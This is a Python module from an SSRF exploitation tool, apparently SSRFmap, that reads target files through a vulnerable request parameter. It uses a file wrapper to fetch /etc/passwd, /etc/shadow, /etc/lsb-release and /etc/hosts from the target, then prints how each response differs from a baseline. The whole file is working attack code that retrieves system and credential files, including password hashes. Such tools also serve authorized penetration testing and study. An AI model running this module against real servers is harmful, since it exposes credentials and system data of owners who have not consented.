from core.utils import *
import logging

name          = "readfiles"
description   = "Read files from the target"
author        = "Swissky"
documentation = []

class exploit():
    files = ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts"]

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            for f in self.files:
                r  = requester.do_request(args.param, wrapper_file(f))
                logging.info("\033[32mReading file\033[0m : {}".format(f))

                # Display diff between default and ssrf request
                diff = diff_text(r.text, default)
                print(diff)
